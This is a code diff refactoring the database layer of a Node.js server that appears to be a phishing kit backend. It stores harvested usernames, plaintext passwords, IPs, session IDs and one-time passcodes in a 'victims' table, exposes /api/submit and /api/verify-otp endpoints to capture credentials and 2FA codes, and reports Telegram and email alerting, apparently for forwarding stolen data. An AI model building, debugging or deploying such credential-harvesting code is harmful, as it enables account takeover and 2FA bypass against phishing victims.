@@ -25,72 +25,119 @@ if (!fs.existsSync(dbDir)) {
     console.log('✅ Database directory created');
 }
 
-// Create database connection
-const db = new sqlite3.Database(DB_PATH, (err) => {
-    if (err) {
-        console.error('❌ Database connection error:', err.message);
-        // Use in-memory database as fallback
-        console.log('⚠️  Falling back to in-memory database');
-        this.db = new sqlite3.Database(':memory:');
-    } else {
-        console.log('✅ Connected to SQLite database');
-        initializeDatabase();
-    }
-});
+// Create database connection with proper initialization
+let db = null;
+let dbInitialized = false;
+let pendingQueries = [];
 
-// Initialize database tables
-function initializeDatabase() {
-    // Create victims table
-    db.run(`
-        CREATE TABLE IF NOT EXISTS victims (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT NOT NULL,
-            password TEXT NOT NULL,
-            ip TEXT,
-            user_agent TEXT,
-            session_id TEXT,
-            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-            otp TEXT,
-            otp_timestamp DATETIME,
-            completed BOOLEAN DEFAULT 0,
-            encrypted_data TEXT
-        )
-    `, (err) => {
-        if (err) {
-            console.error('❌ Error creating victims table:', err.message);
-        } else {
+// Initialize database
+function initDatabase() {
+    return new Promise((resolve, reject) => {
+        db = new sqlite3.Database(DB_PATH, (err) => {
+            if (err) {
+                console.error('❌ Database connection error:', err.message);
+                // Use in-memory database as fallback
+                console.log('⚠️  Falling back to in-memory database');
+                db = new sqlite3.Database(':memory:');
+            } else {
+                console.log('✅ Connected to SQLite database');
+            }
+            resolve(db);
+        });
+    });
+}
+
+// Create tables
+function createTables() {
+    return new Promise((resolve, reject) => {
+        // Create victims table
+        db.run(`
+            CREATE TABLE IF NOT EXISTS victims (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT NOT NULL,
+                password TEXT NOT NULL,
+                ip TEXT,
+                user_agent TEXT,
+                session_id TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                otp TEXT,
+                otp_timestamp DATETIME,
+                completed BOOLEAN DEFAULT 0,
+                encrypted_data TEXT
+            )
+        `, (err) => {
+            if (err) {
+                console.error('❌ Error creating victims table:', err.message);
+                reject(err);
+                return;
+            }
             console.log('✅ Victims table verified');
-        }
+            
+            // Create logs table
+            db.run(`
+                CREATE TABLE IF NOT EXISTS logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    event_type TEXT NOT NULL,
+                    details TEXT,
+                    ip TEXT,
+                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                )
+            `, (err) => {
+                if (err) {
+                    console.error('❌ Error creating logs table:', err.message);
+                    reject(err);
+                    return;
+                }
+                console.log('✅ Logs table verified');
+                
+                // Create indexes
+                db.run(`CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)`, () => {});
+                db.run(`CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)`, () => {});
+                db.run(`CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp)`, () => {});
+                
+                console.log('✅ Database initialization complete');
+                dbInitialized = true;
+                
+                // Process any pending queries
+                processPendingQueries();
+                resolve();
+            });
+        });
     });
+}
 
-    // Create logs table
-    db.run(`
-        CREATE TABLE IF NOT EXISTS logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            event_type TEXT,
-            details TEXT,
-            ip TEXT,
-            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    `, (err) => {
-        if (err) {
-            console.error('❌ Error creating logs table:', err.message);
-        } else {
-            console.log('✅ Logs table verified');
-        }
-    });
+// Process pending queries
+function processPendingQueries() {
+    while (pendingQueries.length > 0) {
+        const query = pendingQueries.shift();
+        query();
+    }
+}
 
-    // Create indexes for performance
-    db.run(`CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)`);
-    db.run(`CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)`);
-    db.run(`CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp)`);
-    
-    console.log('✅ Database initialization complete');
+// Initialize everything
+async function initializeDatabase() {
+    try {
+        await initDatabase();
+        await createTables();
+        return true;
+    } catch (error) {
+        console.error('❌ Database initialization failed:', error.message);
+        return false;
+    }
 }
 
 // ============================================
-// DATABASE OPERATIONS
+// DATABASE OPERATIONS (with ready check)
 // ============================================
+
+// Ensure database is ready
+function ensureDbReady(callback) {
+    if (dbInitialized) {
+        callback();
+    } else {
+        pendingQueries.push(callback);
+    }
+}
 
 // Encrypt data
 function encryptData(data) {
@@ -135,33 +182,35 @@ function decryptData(encryptedData) {
 // Save credentials to database
 function saveCredentials(data) {
     return new Promise((resolve, reject) => {
-        const encrypted = encryptData({
-            username: data.username,
-            password: data.password
-        });
+        ensureDbReady(() => {
+            const encrypted = encryptData({
+                username: data.username,
+                password: data.password
+            });
 
-        const query = `
-            INSERT INTO victims 
-            (username, password, ip, user_agent, session_id, timestamp, encrypted_data)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
-        `;
+            const query = `
+                INSERT INTO victims 
+                (username, password, ip, user_agent, session_id, timestamp, encrypted_data)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            `;
 
-        db.run(query, [
-            data.username,
-            data.password,
-            data.ip || 'unknown',
-            data.userAgent || 'unknown',
-            data.sessionId || 'unknown',
-            data.timestamp || new Date().toISOString(),
-            encrypted
-        ], function(err) {
-            if (err) {
-                console.error('Save credentials error:', err.message);
-                reject(err);
-            } else {
-                console.log(`✅ Credentials saved with ID: ${this.lastID}`);
-                resolve(this.lastID);
-            }
+            db.run(query, [
+                data.username,
+                data.password,
+                data.ip || 'unknown',
+                data.userAgent || 'unknown',
+                data.sessionId || 'unknown',
+                data.timestamp || new Date().toISOString(),
+                encrypted
+            ], function(err) {
+                if (err) {
+                    console.error('Save credentials error:', err.message);
+                    reject(err);
+                } else {
+                    console.log(`✅ Credentials saved with ID: ${this.lastID}`);
+                    resolve(this.lastID);
+                }
+            });
         });
     });
 }
@@ -169,20 +218,22 @@ function saveCredentials(data) {
 // Save OTP to database
 function saveOTP(data) {
     return new Promise((resolve, reject) => {
-        const query = `
-            UPDATE victims 
-            SET otp = ?, otp_timestamp = ?
-            WHERE id = ?
-        `;
+        ensureDbReady(() => {
+            const query = `
+                UPDATE victims 
+                SET otp = ?, otp_timestamp = ?
+                WHERE id = ?
+            `;
 
-        db.run(query, [data.otp, data.timestamp, data.userId], function(err) {
-            if (err) {
-                console.error('Save OTP error:', err.message);
-                reject(err);
-            } else {
-                console.log(`✅ OTP saved for user ID: ${data.userId}`);
-                resolve();
-            }
+            db.run(query, [data.otp, data.timestamp, data.userId], function(err) {
+                if (err) {
+                    console.error('Save OTP error:', err.message);
+                    reject(err);
+                } else {
+                    console.log(`✅ OTP saved for user ID: ${data.userId}`);
+                    resolve();
+                }
+            });
         });
     });
 }
@@ -190,14 +241,16 @@ function saveOTP(data) {
 // Mark as complete
 function markComplete(userId) {
     return new Promise((resolve, reject) => {
-        const query = `UPDATE victims SET completed = 1 WHERE id = ?`;
-        db.run(query, [userId], function(err) {
-            if (err) {
-                console.error('Mark complete error:', err.message);
-                reject(err);
-            } else {
-                resolve();
-            }
+        ensureDbReady(() => {
+            const query = `UPDATE victims SET completed = 1 WHERE id = ?`;
+            db.run(query, [userId], function(err) {
+                if (err) {
+                    console.error('Mark complete error:', err.message);
+                    reject(err);
+                } else {
+                    resolve();
+                }
+            });
         });
     });
 }
@@ -205,43 +258,47 @@ function markComplete(userId) {
 // Get statistics
 function getStats() {
     return new Promise((resolve, reject) => {
-        const query = `
-            SELECT 
-                COUNT(*) as total,
-                SUM(completed) as completed,
-                DATE(timestamp) as date
-            FROM victims
-            GROUP BY DATE(timestamp)
-            ORDER BY DATE(timestamp) DESC
-            LIMIT 7
-        `;
+        ensureDbReady(() => {
+            const query = `
+                SELECT 
+                    COUNT(*) as total,
+                    SUM(completed) as completed,
+                    DATE(timestamp) as date
+                FROM victims
+                GROUP BY DATE(timestamp)
+                ORDER BY DATE(timestamp) DESC
+                LIMIT 7
+            `;
 
-        db.all(query, (err, rows) => {
-            if (err) {
-                reject(err);
-            } else {
-                resolve(rows || []);
-            }
+            db.all(query, (err, rows) => {
+                if (err) {
+                    reject(err);
+                } else {
+                    resolve(rows || []);
+                }
+            });
         });
     });
 }
 
 // Log events
 function logEvent(eventType, details, ip) {
-    const query = `
-        INSERT INTO logs (event_type, details, ip, timestamp)
-        VALUES (?, ?, ?, ?)
-    `;
-    
-    db.run(query, [
-        eventType,
-        JSON.stringify(details),
-        ip || 'unknown',
-        new Date().toISOString()
-    ], (err) => {
-        if (err) {
-            console.error('Log event error:', err.message);
-        }
+    ensureDbReady(() => {
+        const query = `
+            INSERT INTO logs (event_type, details, ip, timestamp)
+            VALUES (?, ?, ?, ?)
+        `;
+        
+        db.run(query, [
+            eventType,
+            JSON.stringify(details),
+            ip || 'unknown',
+            new Date().toISOString()
+        ], (err) => {
+            if (err) {
+                console.error('Log event error:', err.message);
+            }
+        });
     });
 }
 
@@ -470,7 +527,7 @@ app.use((req, res, next) => {
         
         console.log(`${logData.method} ${logData.url} - ${logData.status} - ${logData.duration}`);
         
-        // Log to database
+        // Log to database (will be queued if not ready)
         if (req.url.startsWith('/api/')) {
             logEvent('request', logData, req.ip);
         }
@@ -484,11 +541,20 @@ app.use((req, res, next) => {
 // ============================================
 
 app.get('/health', (req, res) => {
-    db.get('SELECT 1', (err) => {
+    if (!dbInitialized) {
+        res.status(503).json({ 
+            status: 'initializing', 
+            message: 'Database is initializing...',
+            timestamp: new Date().toISOString()
+        });
+        return;
+    }
+    
+    db.get('SELECT 1 FROM victims LIMIT 1', (err) => {
         if (err) {
             res.status(503).json({ 
                 status: 'unhealthy', 
-                error: 'Database connection failed',
+                error: 'Database query failed',
                 timestamp: new Date().toISOString()
             });
         } else {
@@ -528,6 +594,10 @@ app.get('/success', (req, res) => {
 // Submit credentials
 app.post('/api/submit', async (req, res) => {
     try {
+        if (!dbInitialized) {
+            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
+        }
+
         const { username, password } = req.body;
         
         if (!username || !password) {
@@ -604,6 +674,10 @@ app.post('/api/submit', async (req, res) => {
 // Verify OTP
 app.post('/api/verify-otp', async (req, res) => {
     try {
+        if (!dbInitialized) {
+            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
+        }
+
         const { otp } = req.body;
         const userId = req.session?.userId;
 
@@ -727,6 +801,9 @@ IP: ${req.ip || 'unknown'}
 // Get statistics (admin endpoint)
 app.get('/api/stats', async (req, res) => {
     try {
+        if (!dbInitialized) {
+            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
+        }
         const stats = await getStats();
         res.json({ success: true, data: stats });
     } catch (error) {
@@ -738,6 +815,10 @@ app.get('/api/stats', async (req, res) => {
 // Get logs (admin endpoint)
 app.get('/api/logs', async (req, res) => {
     try {
+        if (!dbInitialized) {
+            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
+        }
+        
         const limit = parseInt(req.query.limit) || 50;
         
         const logs = await new Promise((resolve, reject) => {
@@ -782,45 +863,60 @@ app.use((req, res) => {
 // START SERVER
 // ============================================
 
-const server = app.listen(PORT, '0.0.0.0', () => {
-    console.log('='.repeat(60));
-    console.log(`🚀 Server running on http://localhost:${PORT}`);
-    console.log(`📁 Environment: ${process.env.NODE_ENV || 'development'}`);
-    console.log(`🗄️  Database: ${DB_PATH}`);
-    console.log(`📡 Telegram: ${telegram.enabled ? '✅ Enabled' : '❌ Disabled'}`);
-    console.log(`📧 Email: ${email.enabled ? '✅ Enabled' : '❌ Disabled'}`);
-    console.log('='.repeat(60));
-});
-
-// ============================================
-// GRACEFUL SHUTDOWN
-// ============================================
-
-const shutdown = () => {
-    console.log('\n🛑 Shutting down gracefully...');
+// Initialize database first, then start server
+initializeDatabase().then((success) => {
+    if (!success) {
+        console.error('❌ Failed to initialize database. Exiting...');
+        process.exit(1);
+    }
     
-    server.close(() => {
-        console.log('✅ Server closed');
-        
-        db.close((err) => {
-            if (err) {
-                console.error('❌ Database close error:', err.message);
-            } else {
-                console.log('✅ Database connection closed');
-            }
-            process.exit(0);
-        });
+    const server = app.listen(PORT, '0.0.0.0', () => {
+        console.log('='.repeat(60));
+        console.log(`🚀 Server running on http://localhost:${PORT}`);
+        console.log(`📁 Environment: ${process.env.NODE_ENV || 'development'}`);
+        console.log(`🗄️  Database: ${DB_PATH}`);
+        console.log(`📡 Telegram: ${telegram.enabled ? '✅ Enabled' : '❌ Disabled'}`);
+        console.log(`📧 Email: ${email.enabled ? '✅ Enabled' : '❌ Disabled'}`);
+        console.log('='.repeat(60));
     });
-};
 
-process.on('SIGTERM', shutdown);
-process.on('SIGINT', shutdown);
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection:', reason);
+    // ============================================
+    // GRACEFUL SHUTDOWN
+    // ============================================
+
+    const shutdown = () => {
+        console.log('\n🛑 Shutting down gracefully...');
+        
+        server.close(() => {
+            console.log('✅ Server closed');
+            
+            if (db) {
+                db.close((err) => {
+                    if (err) {
+                        console.error('❌ Database close error:', err.message);
+                    } else {
+                        console.log('✅ Database connection closed');
+                    }
+                    process.exit(0);
+                });
+            } else {
+                process.exit(0);
+            }
+        });
+    };
+
+    process.on('SIGTERM', shutdown);
+    process.on('SIGINT', shutdown);
+    process.on('unhandledRejection', (reason, promise) => {
+        console.error('❌ Unhandled Rejection:', reason);
+    });
+
+    // ============================================
+    // EXPORT FOR TESTING
+    // ============================================
+
+    module.exports = { app, db, server };
+}).catch((error) => {
+    console.error('❌ Fatal error:', error.message);
+    process.exit(1);
 });
-
-// ============================================
-// EXPORT FOR TESTING
-// ============================================
-
-module.exports = { app, db, server };
